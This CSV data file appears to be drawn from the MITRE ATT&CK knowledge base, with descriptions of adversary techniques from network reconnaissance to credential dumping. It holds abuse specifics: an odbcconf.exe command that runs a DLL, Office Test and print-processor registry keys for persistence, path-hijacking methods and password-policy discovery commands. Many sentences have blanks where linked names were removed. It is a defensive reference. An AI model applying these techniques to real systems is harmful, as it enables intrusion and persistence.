Network Topology,"Before compromising a victim, adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.Adversaries may gather this information in various ways, such as direct collection actions via  or . Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex: ).",technique
Network Trust Dependencies,"Before compromising a victim, adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.Adversaries may gather this information in various ways, such as direct elicitation via . Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex: ).",technique
Non-Application Layer Protocol,"Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts;  however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",technique
Non-Standard Encoding,"Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.  ",technique
Non-Standard Port,"Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.",technique
OS Credential Dumping,"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform  and access restricted information.Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",technique
OS Exhaustion Flood,"Adversaries may target the operating system (OS) for a DoS attack, since the (OS) is responsible for managing the finite resources on a system. These attacks do not need to exhaust the actual resources on a system since they can simply exhaust the limits that an OS self-imposes to prevent the entire system from being overwhelmed by excessive demands on its capacity.Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods. With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.",technique
Obfuscated Files or Information,"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and  for . The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also used compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. Adversaries may also obfuscate commands executed from payloads or directly via a . Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",technique
Obtain Capabilities,"Before compromising a victim, adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.",technique
Odbcconf,"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. Odbcconf.exe is digitally signed by Microsoft.Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to , odbcconf.exe has a REGSVR flag that can be misused to execute DLLs (ex: odbcconf.exe /S /A &lbrace;REGSVR ""C:\Users\Public\file.dll""&rbrace;).  ",technique
Office Application Startup,"Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page. These persistence mechanisms can work within Outlook or be used through Office 365.",technique
Office Template Macros,"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. Office Visual Basic for Applications (VBA) macros  can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. Shared templates may also be stored and pulled from remote locations. Word Normal.dotm location:<br>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotmExcel Personal.xlsb location:<br>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSBAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under C:\Program Files (x86)\Microsoft Office\root\Office16\, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location. An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",technique
Office Test,"Adversaries may abuse the Microsoft Office ""Office Test"" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.There exist user and global Registry keys for the Office Test feature:* HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf* HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\PerfAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",technique
One-Way Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",technique
Outlook Forms,"Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.Once malicious forms have been added to the users mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.",technique
Outlook Home Page,"Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.Once malicious home pages have been added to the users mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.",technique
Outlook Rules,"Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.Once malicious rules have been added to the users mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.",technique
Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context.Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of / to be explorer.exe rather than an Office document delivered as part of . This spoofing could be executed via  within a malicious Office document or any code that can perform .Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token.",technique
Pass the Hash,"Adversaries may pass the hash using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.",technique
Pass the Ticket,"Adversaries may pass the ticket using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.In this technique, valid Kerberos tickets for  are captured by . A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.",technique
Password Cracking,"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained.  is used to obtain password hashes, this may only get an adversary so far when  is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",technique
Password Filter DLL,"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.",technique
Password Guessing,"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:* SSH (22/TCP)* Telnet (23/TCP)* FTP (21/TCP)* NetBIOS / SMB / Samba (139/TCP & 445/TCP)* LDAP (389/TCP)* Kerberos (88/TCP)* RDP / Terminal Services (3389/TCP)* HTTP/HTTP Management Services (80/TCP & 443/TCP)* MSSQL (1433/TCP)* Oracle (1521/TCP)* MySQL (3306/TCP)* VNC (5900/TCP)In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",technique
Password Policy Discovery,"Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through . This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as net accounts (/domain), Get-ADDefaultDomainPasswordPolicy, chage -l <username>, cat /etc/pam.d/common-password, and pwpolicy getaccountpolicies. ",technique
Password Spraying,"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:* SSH (22/TCP)* Telnet (23/TCP)* FTP (21/TCP)* NetBIOS / SMB / Samba (139/TCP & 445/TCP)* LDAP (389/TCP)* Kerberos (88/TCP)* RDP / Terminal Services (3389/TCP)* HTTP/HTTP Management Services (80/TCP & 443/TCP)* MSSQL (1433/TCP)* Oracle (1521/TCP)* MySQL (3306/TCP)* VNC (5900/TCP)In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",technique
Patch System Image,"Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.     Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the  method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via , authentication, via , and perimeter defenses, via .  Adding new capabilities for the adversarys purpose include , , and .Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with , one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via . When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with  to achieve persistence. ",technique
Path Interception,"**This technique has been deprecated. Please use , , and/or .**Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of  in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. There are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.### Unquoted PathsService paths (stored in Windows Registry keys)  and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\unsafe path with space\program.exe vs. ""C:\safe path with space\program.exe"").  An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program.  ### PATH Environment Variable MisconfigurationThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\system32 (e.g., C:\Windows\system32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.For example, if C:\example path precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example path will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.### Search Order HijackingSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program.    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument net user. An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then cmd.exe /C net user will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT. Search order hijacking is also a common practice for hijacking DLL loads and is covered in .",technique
Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\system32 (e.g., C:\Windows\system32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.For example, if C:\example path precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example path will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",technique
Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike , the search order differs depending on the method that is used to execute the program.    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument net user. An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then cmd.exe /C net user will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT. Search order hijacking is also a common practice for hijacking DLL loads and is covered in .",technique
Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.Service paths  and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\unsafe path with space\program.exe vs. ""C:\safe path with space\program.exe"").  (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program.  This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",technique
Peripheral Device Discovery,"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",technique
Permission Groups Discovery,"Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.",technique
Phishing,"Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems or to gather credentials for use of . Phishing may also be conducted via third-party services, like social media platforms.",technique
Phishing for Information,"Before compromising a victim, adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from  in that the objective is gathering data from the victim rather than executing malicious code.All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means. Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:  or ) and/or sending multiple, seemingly urgent messages.",technique
Plist Modification,"Adversaries may modify plist files to run a program during system boot or user login. Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as /Library/Preferences (which execute with elevated privileges) and ~/Library/Preferences (which execute with a user's privileges). Adversaries can modify plist files to execute their code as part of establishing persistence. plists may also be used to elevate privileges since they may execute in the context of another user. A specific plist used for execution at login is com.apple.loginitems.plist. Applications under this plist run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them. Users have direct control over login items installed using a shared file list which are also visible in System Preferences . Some of these applications can open visible dialogs to the user, but they dont all have to since there is an option to ""hide"" the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in  . The API method  SMLoginItemSetEnabled can be used to set Login Items, but scripting languages like  can do this as well. ",technique
Pluggable Authentication Modules,"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.Adversaries may modify components of the PAM system to create backdoors. PAM components, such as pam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials.Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.",technique
Port Knocking,"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.This technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",technique
Port Monitors,"Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup.  This DLL can be located in C:\Windows\System32 and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.  Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors. The Registry key contains entries for the following:* Local Port* Standard TCP/IP Port* USB Monitor* WSD PortAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",technique
Portable Executable Injection,"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.  Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. ",technique
PowerShell,"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.  Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.A number of PowerShell-based offensive testing tools are available, including ,  , , and PSAttack.PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). ",technique
PowerShell Profile,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (profile.ps1) is a script that runs when  starts and can be used as a logon script to customize user environments. supports several profiles depending on the user or host program. For example, there can be different profiles for  host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.  Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or  drives to gain persistence. Every time a user opens a  session the modified script will be executed unless the -NoProfile flag is used when it is launched.  An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. ",technique
Pre-OS Boot,"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",technique
Print Processors,"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the AddPrintProcessor API call with an account that has SeLoadDriverPrivilege enabled. Alternatively, a print processor can be registered to the print spooler service by adding the HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the GetPrintProcessorDirectory API call. After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run. The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",technique
Private Keys,"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as ~/.ssh for SSH keys on * nix-based systems or C:&#92;Users&#92;(username)&#92;.ssh&#92; on Windows. These private keys can be used to authenticate to  like SSH or for use in decrypting other collected files such as email.Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.Some private keys require a password or passphrase for operation, so an adversary may also use  for keylogging or attempt to  the passphrase off-line.",technique
Proc Filesystem,"Adversaries may gather credentials from information stored in the Proc filesystem or /proc. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.This functionality has been implemented in the MimiPenguin, an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.",technique
